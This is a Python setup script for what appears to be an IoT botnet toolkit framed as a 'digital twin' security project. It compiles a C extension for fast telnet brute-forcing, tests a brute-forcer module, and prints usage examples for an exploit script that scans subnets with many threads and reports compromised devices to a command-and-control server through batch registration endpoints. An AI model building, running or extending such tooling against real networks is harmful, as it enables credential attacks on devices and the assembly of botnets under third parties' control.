#!/usr/bin/env python3
"""
Performance Setup Script for IoT Digital Twin
This script compiles the C extension and sets up the optimized environment
"""

import os
import sys
import subprocess
import platform

def main():
    print("🚀 Setting up high-performance IoT Digital Twin environment...")
    
    # Check if we're in the right directory
    if not os.path.exists("fast_telnet_bruteforce.c"):
        print("❌ Error: fast_telnet_bruteforce.c not found")
        print("   Please run this script from the Scripts/AttackThreat directory")
        return False
    
    # Check Python version
    if sys.version_info < (3, 6):
        print("❌ Error: Python 3.6 or higher is required")
        return False
    
    print(f"✅ Python {sys.version.split()[0]} detected")
    print(f"✅ Platform: {platform.system()} {platform.machine()}")
    
    # Try to compile the C extension
    print("\n📦 Compiling C extension for maximum performance...")
    
    try:
        # Run the setup script
        result = subprocess.run([
            sys.executable, "setup_fast_bruteforce.py", "build_ext", "--inplace"
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✅ C extension compiled successfully!")
            print("   Fast telnet brute-forcing is now available")
        else:
            print("⚠️  C extension compilation failed")
            print("   Falling back to Python-only mode")
            print(f"   Error: {result.stderr}")
            
    except Exception as e:
        print(f"⚠️  C extension compilation failed: {e}")
        print("   Falling back to Python-only mode")
    
    # Test the optimized script
    print("\n🧪 Testing optimized components...")
    
    try:
        # Test importing the optimized modules
        sys.path.insert(0, '.')
        from modules.telnet_bruteforcer import TelnetBruteForcer
        
        bruteforcer = TelnetBruteForcer()
        if hasattr(bruteforcer, 'use_fast_mode') and bruteforcer.use_fast_mode:
            print("✅ Fast mode available and enabled")
        else:
            print("✅ Standard threaded mode available")
            
    except Exception as e:
        print(f"❌ Error testing components: {e}")
        return False
    
    # Performance recommendations
    print("\n⚡ Performance Optimization Tips:")
    print("1. Use exploit_optimized.py instead of exploit.py for best performance")
    print("2. Increase thread count with --threads parameter for faster scanning")
    print("3. Use --fast flag to enable C extension (if compiled successfully)")
    print("4. Batch operations reduce C2 server communication overhead")
    print("5. Cached C2 status checks reduce network latency")
    
    # Usage examples
    print("\n📖 Usage Examples:")
    print("   # Basic optimized usage:")
    print("   python exploit_optimized.py --cnc 192.168.1.100")
    print()
    print("   # High-performance mode with 30 threads:")
    print("   python exploit_optimized.py --cnc 192.168.1.100 --threads 30 --fast")
    print()
    print("   # Custom subnet with optimizations:")
    print("   python exploit_optimized.py --cnc 192.168.1.100 --subnet 192.168.1.0/24 --threads 25")
    
    # Check for C2 server requirements
    print("\n🔧 C2 Server Optimization Requirements:")
    print("   Make sure your C2 server supports these new endpoints:")
    print("   • /batch-add-scan-results - For efficient scan result uploads")
    print("   • /batch-register-devices - For efficient device registration")
    print("   • /get-all-data - For efficient data synchronization")
    print("   These endpoints significantly reduce network overhead")
    
    print("\n✅ Setup complete! Ready for high-performance IoT security research.")
    return True

if __name__ == "__main__":
    success = main()
    if not success:
        sys.exit(1)
